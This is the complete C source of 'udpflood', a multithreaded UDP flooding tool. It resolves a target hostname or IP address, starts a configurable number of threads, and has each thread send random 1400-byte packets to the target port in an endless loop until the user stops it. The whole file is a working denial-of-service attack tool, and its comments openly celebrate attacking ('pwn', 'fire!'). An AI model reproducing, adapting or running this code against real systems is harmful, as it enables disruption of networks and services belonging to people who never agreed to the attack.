/* -*- Mode: C; indent-tabs-mode: t; c-basic-offset: 4; tab-width: 4 -*- */
/*
 * main.c
 * Copyright (C) Benjamin Höglinger 2010 <nefarius@darkhosters.net>
 *
 * udpflood is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * udpflood is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <libgen.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <memory.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include "version.h"

// best result with 1400 not 1500 (max. default MTU size)
#define BUFLEN 1400


void usage(void);
void diep(char *error);
void *start_flood(void *arg);

struct con_data
{
    struct sockaddr_storage si_host;
    int sockfd;
};

/*
 * main function ;P
 */
int main(int argc, char** argv)
{
    // default values
    int c, tcount = 5, buff_size = 0, port = 9;
    int family = AF_INET, protocol = IPPROTO_UDP;
    char *target = NULL;

    if(argc <= 1)
    {
        usage();
    }

    opterr = 0;
    while((c = getopt(argc, argv, "t:c:b:6p:")) != -1)
    {
        switch(c)
        {
        case 't': // the target hostname/ip address
            target = optarg;
            break;
        case 'c': // count of active threads
            tcount = atoi(optarg);
            break;
        case 'b': // send buffer size
            buff_size = atoi(optarg);
            break;
        case '6': // IPv6 mode
            family = AF_INET6;
            break;
        case 'p': // port
            port = atoi(optarg);
            break;
        case '?': // garbage
            if (optopt == 't' || optopt == 'c' || optopt == 'b' || optopt == 'p')
                fprintf (stderr, "Option -%c requires an argument.\n", optopt);
            else if (isprint (optopt))
                fprintf (stderr, "Unknown option `-%c'.\n", optopt);
            else
                fprintf (stderr,
                         "Unknown option character `\\x%x'.\n",
                         optopt);
            exit(EXIT_FAILURE);
            break;
        default: // fail
            usage();
            break;
        }
    }

    // at least a target is needed
    if(target == NULL)
    {
        diep("No target specified.");
    }

    // common connection info
    struct con_data info;
    memset(&info, 0, sizeof(info));
    // IPv4
    struct sockaddr_in *si_target = (struct sockaddr_in*)&info.si_host;
    // IPv6
    struct sockaddr_in6 *si_target6 = (struct sockaddr_in6*)&info.si_host;

    // socket variable
    int ret, sock_buf_size;
    socklen_t optlen = sizeof(sock_buf_size);
    // init random number generator
    srand(time(0));

    // create new UDP socket
    if ((info.sockfd = socket(family, SOCK_DGRAM, protocol)) == -1)
    {
        diep("socket() failed");
    }

    struct addrinfo *res, *result, hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_family = family;
    int error;
    char straddr[INET_ADDRSTRLEN] = "";
    char straddr6[INET6_ADDRSTRLEN] = "";

    if(inet_pton(AF_INET6, target, &si_target6->sin6_addr) == 0)
    {
        if(inet_pton(AF_INET, target, &si_target->sin_addr) == 0)
        {
            /* resolve the domain name into a list of addresses */
            error = getaddrinfo(target, NULL, &hints, &result);
            if (error != 0)
            {
                fprintf(stderr, "error in getaddrinfo: %s\n", gai_strerror(error));
                return EXIT_FAILURE;
            }

            for(res = result; res != NULL; res = res->ai_next)
            {
                info.si_host = *((struct sockaddr_storage*)res->ai_addr);
                break;
            }

            freeaddrinfo(result);

            switch(family)
            {
            case AF_INET:
                inet_ntop(AF_INET, &si_target->sin_addr, straddr, sizeof(straddr));
                printf("resolved %s to %s\n", target, straddr);
                break;
            case AF_INET6:
                inet_ntop(AF_INET6, &si_target6->sin6_addr, straddr6, sizeof(straddr6));
                printf("resolved %s to %s\n", target, straddr6);
                break;
            }
        }
    }

    switch(family)
    {
    case AF_INET:
        si_target->sin_port = htons(port);
        break;
    case AF_INET6:
        si_target6->sin6_port = htons(port);
        break;
    }

    // get current kernel socket send buffer size
    ret = getsockopt(info.sockfd, SOL_SOCKET, SO_SNDBUF, (char *) & sock_buf_size, &optlen);
    // catch error and exit
    if (ret == -1)
        diep("getsockopt() failed");
    else
        printf("kernel send buffer size is %d\n", sock_buf_size);

    // set new buffer size if set
    if (buff_size > 0)
    {
        sock_buf_size = buff_size * 1024;
        ret = setsockopt(info.sockfd, SOL_SOCKET, SO_SNDBUF, &sock_buf_size, sizeof(sock_buf_size));
        if (ret == -1)
            diep("setsockopt() failed");
        else
            printf("new send buffer size set to %d\n", sock_buf_size * 2);
    }

    int i = 0;
    pthread_t *flood_t = (pthread_t*)malloc(sizeof(pthread_t) * tcount);

    for(i = 0; i < tcount; i++)
    {
        // create flood thread
        pthread_create(&flood_t[i], NULL, start_flood, &info);
        pthread_detach(flood_t[i]);
    }
    printf("spawned %d threads\n", i);

    // last message before pwn...
    printf("press Enter to stop flooding...");
    fflush(stdout);

    // wait for enter hit
    while (getchar() != 0xA);

    for(i = 0; i < tcount; i++)
    {
        // end thread
        pthread_cancel(flood_t[i]);
    }
    printf("killed %d threads\n", i);
    free(flood_t);

    // we close the socket
    shutdown(info.sockfd, SHUT_RDWR);
    printf("program terminated successfully\n");
    return (EXIT_SUCCESS);
}

/*
 * print usage string
 */
void usage(void)
{
    printf("Usage: udpflood -t hostname [-c thread count] [-b send buffer size (in KBytes)]\n");
    exit(EXIT_FAILURE);
}

/*
 * print error message and exit
 */
void diep(char *error)
{
    fprintf(stderr, "%s: %s\n", error, gai_strerror(errno));
    exit(EXIT_FAILURE);
}

/*
 * start the flooding thread
 */
void *start_flood(void *arg)
{
    char buffer[BUFLEN] = "";
    int i = 0;
    struct con_data info = *((struct con_data*)(arg));

    // fill buffer with random data :)
    memset(buffer, 0, sizeof (buffer));
    for (i = 0; i < BUFLEN; i++)
    {
        buffer[i] = (char) rand() % 255;
    }

    // fire!
    while (1)
    {
        if (sendto(info.sockfd, buffer, BUFLEN, 0, (struct sockaddr*)&info.si_host, sizeof(info.si_host)) == -1)
        {
            diep("sendto() failed");
        }
    }
}
